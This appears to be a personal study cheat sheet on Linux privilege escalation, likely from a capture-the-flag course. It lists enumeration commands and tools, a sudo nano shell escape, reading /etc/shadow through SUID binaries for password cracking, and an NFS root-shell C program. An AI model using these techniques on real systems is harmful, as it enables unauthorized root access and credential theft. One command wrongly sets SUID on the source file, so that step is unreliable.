# Privilage Escalation

the `hostname` command will return the hostname of the target machine. Although this value can easily be changed or have a relatively meaningless string

`uname -a` print system information giving us additional detail about the kernel used by the system.

`/proc/version` may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.

the `/etc/issue` file. This file usually contains some information about the operating system but can easily be customized or changes.

The output of the `ps` (Process Status) will show the following:

* **PID:** The process ID (unique to the process)
* **TTY:** Terminal type used by the user
* **Time:** Amount of CPU time used by the process (this is NOT the time this process has been running for)
* **CMD:** The command or executable running (will NOT display any command line parameter)

`ps -A` View all running processes `ps axjf` View process tree `ps aux`

* The aux option will show processes for all users (a)
* Display the user that launched the process (u)
* Show processes that are not attached to a terminal (x)

The `env` command will show environmental variables.

The `sudo -l` command can be used to list all commands your user can run using `sudo`.

The `id` command will provide a general overview of the user’s privilege level and group memberships.

`/etc/passwd` file can be an easy way to discover users on the system.

The `ip route` command to see which network routes exist.

#### Netstat comman

The `netstat` command can be used to gather information on existing connections:

`netstat -a` shows all listening ports and established connections.

`netstat -at` or `netstat -au` can be used to list TCP or UDP protocols respectively.

`netstat -l` list ports in “listening” mode.

* These ports are open and ready to accept incoming connections.
* This can be used with the “t” option to list only ports that are listening using the TCP protocol

`netstat -s` list network usage statistics by protocol

* This can also be used with the `-t` or `-u` options to limit the output to a specific protocol.

`netstat -tp` list connections with the service name and PID information.

`netstat -i` Shows interface statistics.

`netstat -ano` which could be broken down as follows:

* `-a` Display all sockets
* `-n` Do not resolve names
* `-o` Display timers

#### find Command

`find . -name flag1.txt` find the file named “flag1.txt” in the current directory

`find /home -name flag1.txt` find the file names “flag1.txt” in the /home directory

`find / -type d -name config` find the directory named config under “/”

`find / -type f -perm 0777` find files with the 777 permissions (files readable, writable, and executable by all users)

`find / -perm a=x` find executable files

`find /home -user frank` find all files for user “frank” under “/home”

`find / -mtime 10` find files that were modified in the last 10 days

`find / -atime 10` find files that were accessed in the last 10 day

`find / -cmin -60` find files changed within the last hour (60 minutes)

`find / -amin -60` find files accesses within the last hour (60 minutes)

`find / -size 50M` find files with a 50 MB size

* This command can also be used with `(+)` and `(-)` signs to specify a file that is larger or smaller than the given size.

**Find world-writeable folders:**

* `find / -writable -type d 2>/dev/null`
* `find / -perm -222 -type d 2>/dev/null`
* `find / -perm -o w -type d 2>/dev/null`

**Find world-executable folders:**

* `find / -perm -o x -type d 2>/dev/null`

**Find development tools and supported languages:**

* `find / -name perl*`
* `find / -name python*`
* `find / -name gcc*`

`find / -perm -u=s -type f 2>/dev/null` Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.

### Automated Enumeration Tools

* **LinPeas:** https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
* **LinEnum:** https://github.com/rebootuser/LinEnum
  * https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
* **LES (Linux Exploit Suggester):** https://github.com/mzet-/linux-exploit-suggester
* **Linux Smart Enumeration:** https://github.com/diego-treitos/linux-smart-enumeration
* **Linux Priv Checker:** https://github.com/linted/linuxprivchecker

#### LinEnum get on the target machine

* Go to the directory that you have your local copy of LinEnum stored in, and start a Python web server using `python3 -m http.server 8000` .
* Then using `wget` on the target machine, and your local IP, you can grab the file from your local machine.
* Then make the file executable using the command `chmod +x FILENAME.sh`.

## Privilege Escalation - sudo

* Run `sudo nano` and press CTRL+R and CTRL+X.
* Enter the following command to gain root access: `reset; bash 1>&0 2>&0` and press Enter.

## Privilege Escalation SUID (Set-user Identification)

* **SUID (Set-user Identification)** The SUID bit set for the nano text editor allows us to create, edit and read files using the file owner’s privilege.
* `find / -type f -perm -04000 -ls 2>/dev/null`
* `nano /etc/shadow` will print the contents of the `/etc/shadow` file.
* `unshadow passwd.txt shadow.txt > passwords.txt`

`base64 /etc/passwd | base64 --decode`

* **SGID (Set-group Identification**

## Privilege Escalation Capabilities

The capabilities man page provides detailed information on its usage and options.

`getcap -r / 2>/dev/null`

When run as an unprivileged user, `getcap -r /` will generate a huge amount of errors, so it is good practice to redirect the error messages to `/dev/null`.

## Privilege Escalation Cron Jobs

Cron jobs are used to run scripts or binaries at specific times

`cat /etc/crontab` `locate antivirus.sh`

## Privilege Escalation Path

A simple search for writable folders can done using the `find / -writable 2>/dev/null` The output of this command can be cleaned using a simple cut and sort sequence. `find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u`

## Privilege Escalation NFS

NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.

Target computer:

* `showmount -e 10.10.2.12`
* `mount -o rw 10.10.2.12:/home/ubuntu/sharedfolder /folder`
* create code.c

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main (void) {
	setuid(0);
	setgid(0);
	system("/bin/bash -p");
	return 0;
}
```

* `gcc code.c -o code -w`
* `chmod +s code.c`
